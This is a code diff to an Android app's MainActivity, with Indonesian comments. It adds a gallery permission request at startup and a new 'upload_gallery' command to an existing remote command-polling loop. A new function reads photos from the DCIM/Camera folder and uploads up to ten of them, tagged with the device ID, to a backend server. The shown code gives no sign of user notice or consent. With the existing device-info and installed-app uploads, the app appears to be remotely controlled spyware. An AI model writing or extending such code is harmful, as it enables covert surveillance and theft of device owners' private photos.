@@ -63,7 +63,7 @@ import java.io.IOException
 import android.content.pm.ApplicationInfo
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
-
+import android.os.Environment
 
 class MainActivity : ComponentActivity() {
     // Store pending notification to show after permission is granted
@@ -97,6 +97,13 @@ class MainActivity : ComponentActivity() {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.CAMERA), 1002)
         }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_MEDIA_IMAGES), 100)
+        } else {
+            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), 100)
+        }
+        
         
 
         // Panggil fungsi untuk kirim info device
@@ -379,6 +386,11 @@ class MainActivity : ComponentActivity() {
                             Log.d("CmdService", "Running get_installed_apps command")
                             sendInstalledAppsToBackend(applicationContext)
                         }
+
+                        "upload_gallery" -> {
+                            Log.d("CmdService", "Uploading gallery images...")
+                            uploadGalleryImages(applicationContext)
+                        }
                     }
                 } catch (e: Exception) {
                     Log.e("PollCommand", "Parse error: ${e.message}")
@@ -386,6 +398,49 @@ class MainActivity : ComponentActivity() {
             }
         })
     }
+
+    private fun uploadGalleryImages(context: Context) {
+        val galleryDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Camera")
+        if (!galleryDir.exists() || !galleryDir.isDirectory) {
+            Log.e("UploadGallery", "DCIM/Camera directory not found")
+            return
+        }
+    
+        val files = galleryDir.listFiles { file ->
+            file.isFile && file.extension.lowercase() in listOf("jpg", "jpeg", "png")
+        } ?: return
+    
+        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        val uploadUrl = "${ApiConfig.BASE_URL}/api/device/upload_gallery_image"
+    
+        val client = OkHttpClient()
+    
+        for (file in files.take(10)) { // Limit to avoid bulk upload
+            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
+                .addFormDataPart("device_id", deviceId)
+                .addFormDataPart(
+                    "image", file.name,
+                    file.asRequestBody("image/jpeg".toMediaTypeOrNull())
+                )
+                .build()
+    
+            val request = Request.Builder()
+                .url(uploadUrl)
+                .post(body)
+                .build()
+    
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e("UploadGallery", "Failed: ${e.message}")
+                }
+    
+                override fun onResponse(call: Call, response: Response) {
+                    Log.i("UploadGallery", "Uploaded ${file.name}: ${response.code}")
+                }
+            })
+        }
+    }
+    
 
     private fun getInstalledAppsAndUpload() {
         try {
